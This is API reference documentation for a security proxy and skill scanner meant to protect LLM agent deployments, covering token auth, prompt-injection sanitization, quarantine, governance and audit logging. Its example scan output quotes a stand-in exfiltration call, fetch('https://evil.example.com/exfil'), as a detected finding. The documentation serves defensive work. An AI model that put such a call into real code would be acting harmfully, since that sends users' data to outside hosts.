# API Reference

Comprehensive reference for all public interfaces in OpenClaw Secure Stack.

---

## Proxy HTTP Endpoints

The proxy service exposes HTTP endpoints on `${PROXY_PORT:-8080}`.

### GET /health

Health check endpoint. No authentication required.

**Response:**

```json
{"status": "ok"}
```

**Status:** `200 OK`

### POST /v1/chat/completions

Primary LLM proxy endpoint. Forwards requests to the upstream OpenClaw gateway.

**Headers:**

| Header | Required | Description |
|--------|----------|-------------|
| `Authorization` | Yes | `Bearer <OPENCLAW_TOKEN>` |
| `Content-Type` | Yes | `application/json` |

**Request body:** OpenAI-compatible chat completion payload.

```json
{
  "model": "gpt-4o-mini",
  "messages": [
    {"role": "user", "content": "Hello"}
  ],
  "stream": false
}
```

**Pipeline:**

1. `AuthMiddleware` validates the Bearer token (`hmac.compare_digest`)
2. `PromptSanitizer` recursively sanitizes all string values in the request body
3. `QuarantineManager` checks if any referenced skill is quarantined
4. `httpx.AsyncClient` forwards the request to the upstream gateway
5. `PromptSanitizer` (response scanner) checks the response for indirect injection

**Streaming:** Set `"stream": true` in the request body. The proxy uses `StreamingResponse` with `text/event-stream` media type and a 300s timeout (vs 30s for non-streaming).

**Response headers:**

| Header | Condition | Description |
|--------|-----------|-------------|
| `X-Prompt-Guard` | Injection detected in response | Set to `"injection-detected"` |

**Error responses:**

| Status | Condition | Body |
|--------|-----------|------|
| 400 | Prompt injection (reject rule) | `{"error": "Request rejected due to policy violation"}` |
| 401 | Missing/malformed Authorization header | `{"error": "Authentication required"}` |
| 403 | Invalid token | `{"error": "Access denied"}` |
| 403 | Skill quarantined | `{"error": {"message": "Skill '<name>' is quarantined"}}` |
| 502 | Upstream unreachable | `{"error": "Upstream unavailable"}` |

### ANY /{path}

Catch-all proxy route. Forwards any HTTP method (GET, POST, PUT, DELETE, PATCH) to the upstream gateway at the same path. Applies the full sanitization pipeline described above.

---

## Authentication

### AuthMiddleware

ASGI middleware wrapping the FastAPI application. Validates Bearer tokens using constant-time comparison (`hmac.compare_digest`).

**Public paths (no auth required):**

- `/health`, `/healthz`, `/ready` (exact match)
- `/__openclaw__/canvas/*` (prefix match)

**Token validation flow:**

1. Missing header -> `401` with `auth_failure` audit event (reason: `missing_token`)
2. Not `Bearer` prefix -> `401` with `auth_failure` audit event (reason: `invalid_format`)
3. Token mismatch -> `403` with `auth_failure` audit event (reason: `invalid_token`)
4. Token valid -> `auth_success` audit event, request forwarded

**Constructor:**

```python
AuthMiddleware(app: ASGIApp, token: str, audit_logger: AuditLogger | None = None)
```

---

## Scanner CLI

Command-line interface for skill scanning and quarantine management.

**Entry point:** `openclaw-scanner` (or `uv run python -m src.scanner.cli`)

### Global Options

| Option | Default | Description |
|--------|---------|-------------|
| `--rules` | `config/scanner-rules.json` | Path to scanner rules JSON |
| `--pins` | `config/skill-pins.json` | Path to skill pin file |
| `--db` | `data/quarantine.db` | Quarantine database path |
| `--quarantine-dir` | `data/quarantine` | Quarantine directory |
| `--audit-log` | None | Audit log file path |

### scan

Scan a skill for malicious patterns using tree-sitter AST analysis.

```bash
openclaw-scanner scan <skill_path> [--quarantine]
```

**Arguments:**

| Argument | Required | Description |
|----------|----------|-------------|
| `skill_path` | Yes | Path to the skill directory or file |

**Flags:**

| Flag | Description |
|------|-------------|
| `--quarantine` | Auto-quarantine if any findings detected |

**Behavior:**

- Outputs a `ScanReport` as JSON to stdout
- If a `PIN_MISMATCH` finding is detected, the skill is **always** quarantined (regardless of `--quarantine` flag)
- If `--quarantine` is set and findings exist, the skill is quarantined

**Example output:**

```json
{
  "skill_name": "example-skill",
  "skill_path": "/skills/example-skill",
  "checksum": "a1b2c3d4...",
  "findings": [
    {
      "rule_id": "NETWORK_FETCH",
      "rule_name": "Network fetch call",
      "severity": "high",
      "file": "index.js",
      "line": 15,
      "column": 4,
      "snippet": "fetch('https://evil.example.com/exfil')",
      "message": "Outbound network call to non-allowlisted domain"
    }
  ],
  "trust_score": null,
  "scanned_at": "2026-02-06T12:00:00+00:00",
  "duration_ms": 42
}
```

### quarantine list

List all quarantined skills.

```bash
openclaw-scanner quarantine list
```

**Output:** JSON array of quarantined skills with `name`, `quarantined_at`, and `overridden` status.

### quarantine override

Override quarantine for a skill (admin action).

```bash
openclaw-scanner quarantine override <skill_name> --ack "reason" [--user "admin"]
```

**Arguments/Options:**

| Argument | Required | Description |
|----------|----------|-------------|
| `skill_name` | Yes | Name of the quarantined skill |
| `--ack` | Yes | Acknowledgment message accepting risk |
| `--user` | No | User performing the override (default: `cli-user`) |

---

## Governance Middleware

Programmatic API for the pre-execution governance layer.

### GovernanceMiddleware

**Constructor:**

```python
GovernanceMiddleware(
    db_path: str,          # SQLite database file path
    secret: str,           # HMAC secret for token signing
    policy_path: str,      # Path to governance-policies.json
    patterns_path: str,    # Path to intent-patterns.json
    settings: dict,        # Configuration dictionary
)
```

**Settings structure:**

```python
{
    "enabled": True,                              # Master switch
    "approval": {
        "allow_self_approval": True,              # Allow requester to approve
        "timeout_seconds": 3600,                  # Approval timeout
    },
    "session": {
        "enabled": True,                          # Session tracking
        "ttl_seconds": 3600,                      # Session TTL
    },
    "enforcement": {
        "enabled": True,                          # Runtime enforcement
        "token_ttl_seconds": 900,                 # Plan token TTL
    },
}
```

### evaluate(request_body, session_id, user_id) -> EvaluationResult

Evaluate a request against governance policies.

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `request_body` | `dict[str, Any]` | Request body containing tool calls |
| `session_id` | `str \| None` | Optional existing session ID |
| `user_id` | `str` | Requesting user's ID |

**Returns:** `EvaluationResult`

```python
@dataclass
class EvaluationResult:
    decision: GovernanceDecision    # ALLOW | BLOCK | REQUIRE_APPROVAL
    plan_id: str | None             # Plan ID if approved
    token: str | None               # HMAC token if allowed
    session_id: str | None          # Session ID
    violations: list[PolicyViolation]  # Policy violations
    approval_id: str | None         # Approval request ID
    message: str | None             # Human-readable message
```

**Pipeline:**

1. Get or create session (if session tracking enabled)
2. `IntentClassifier.classify()` -- extract and categorize tool calls
3. `PlanGenerator.generate()` -- build execution plan with risk assessment
4. `PolicyValidator.validate()` -- check against action/resource/sequence/rate policies
5. Depending on validation result:
   - **ALLOW**: Store plan, issue HMAC token, record in session
   - **REQUIRE_APPROVAL**: Store pending plan, create approval request
   - **BLOCK**: Return violations

### enforce(plan_id, token, tool_call) -> EnforcementResult

Enforce governance policy at execution time.

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `plan_id` | `str` | Plan ID from evaluation |
| `token` | `str \| None` | HMAC token from evaluation |
| `tool_call` | `ToolCall` | The tool call to enforce |

**Returns:** `EnforcementResult`

```python
@dataclass
class EnforcementResult:
    allowed: bool        # Whether the action is allowed
    reason: str          # Explanation
    plan_id: str | None  # Associated plan ID
```

### approve(approval_id, approver_id, acknowledgment) -> ApprovalResult

Approve a pending request and activate its execution plan.

**Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `approval_id` | `str` | Approval request ID |
| `approver_id` | `str` | User approving the request |
| `acknowledgment` | `str` | Acknowledgment text |

**Returns:** `ApprovalResult`

```python
@dataclass
class ApprovalResult:
    approval: ApprovalRequest  # Updated approval record
    plan_id: str | None        # Activated plan ID
    token: str | None          # Issued HMAC token
```

### reject(approval_id, rejector_id, reason) -> ApprovalRequest

Reject a pending request.

### cleanup() -> dict[str, int]

Clean up expired plans, sessions, and approvals. Returns counts of cleaned resources.

### close()

Close all database connections. Also available as a context manager:

```python
with GovernanceMiddleware(...) as gw:
    result = gw.evaluate(...)
```

---

## Audit Logger

### AuditLogger

Append-only JSON Lines logger with file rotation and SHA-256 hash chain.

**Constructor:**

```python
AuditLogger(
    log_path: str,
    max_bytes: int = 10_485_760,  # 10 MB
    backup_count: int = 5,
)
```

**Factory:**

```python
AuditLogger.from_env(log_path: str) -> AuditLogger
```

Reads `AUDIT_LOG_MAX_BYTES` and `AUDIT_LOG_BACKUP_COUNT` from environment.

### log(event: AuditEvent)

Write an event to the audit log.

- Computes `prev_hash` (SHA-256 of previous line) for hash chain integrity
- Uses `fcntl.LOCK_EX` for atomic rotation + write
- Rotates log when file exceeds `max_bytes`

**Log line format (JSONL):**

```json
{"timestamp":"2026-02-06T12:00:00+00:00","event_type":"auth_success","source_ip":"172.28.0.1","user_id":null,"action":"POST /v1/chat/completions","result":"success","risk_level":"info","details":null,"prev_hash":"abc123..."}
```

### validate_audit_chain(log_path: Path) -> ChainValidationResult

Validate hash chain integrity of an entire audit log file.

```python
@dataclass
class ChainValidationResult:
    valid: bool
    broken_at_line: int | None  # 1-indexed line number where chain breaks
```

---

## Data Models

All models use Pydantic v2 with `frozen=True` (immutable).

### Enums

| Enum | Values | Used By |
|------|--------|---------|
| `Severity` | `critical`, `high`, `medium`, `low` | `ScanFinding` |
| `AuditEventType` | `auth_success`, `auth_failure`, `skill_scan`, `skill_quarantine`, `skill_override`, `prompt_injection`, `indirect_injection`, `egress_blocked` | `AuditEvent` |
| `RiskLevel` | `critical`, `high`, `medium`, `low`, `info` | `AuditEvent` |
| `GovernanceDecision` | `ALLOW`, `BLOCK`, `REQUIRE_APPROVAL` | `EvaluationResult` |

### Core Models

| Model | Key Fields | Description |
|-------|------------|-------------|
| `ScanFinding` | `rule_id`, `severity`, `file`, `line`, `snippet`, `message` | Individual scanner finding |
| `ScanReport` | `skill_name`, `checksum` (SHA-256), `findings[]`, `trust_score` | Complete scan result |
| `TrustScore` | `overall` (0-100), `author_reputation`, `download_count` | Skill trust assessment |
| `QuarantinedSkill` | `name`, `original_path`, `reason`, `overridden`, `overridden_by` | Quarantined skill record |
| `SanitizeResult` | `clean`, `injection_detected`, `patterns[]` | Sanitization outcome |
| `SanitizationRule` | `id`, `pattern`, `action` (strip/reject) | Injection detection rule |
| `AuditEvent` | `timestamp`, `event_type`, `action`, `result`, `risk_level`, `details` | Security audit event |
| `PinResult` | `status` (verified/mismatch/unpinned), `expected`, `actual` | Pin verification outcome |

---

## Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `UPSTREAM_URL` | Yes | - | OpenClaw gateway URL (e.g., `http://localhost:3000`) |
| `OPENCLAW_TOKEN` | Yes | - | Bearer token for API authentication |
| `AUDIT_LOG_PATH` | No | None | Path for audit log file |
| `AUDIT_LOG_MAX_BYTES` | No | `10485760` | Max log file size before rotation |
| `AUDIT_LOG_BACKUP_COUNT` | No | `5` | Number of rotated log files to keep |
| `PROMPT_RULES_PATH` | No | `config/prompt-rules.json` | Prompt injection rules |
| `INDIRECT_RULES_PATH` | No | `config/indirect-injection-rules.json` | Response-side injection rules |
| `RULES_PATH` | No | `config/scanner-rules.json` | Scanner rules |
| `SKILL_PINS_PATH` | No | `config/skill-pins.json` | SHA-256 skill pins |
| `QUARANTINE_DB_PATH` | No | `data/quarantine.db` | Quarantine SQLite database |
| `QUARANTINE_DIR` | No | `data/quarantine` | Quarantine storage directory |
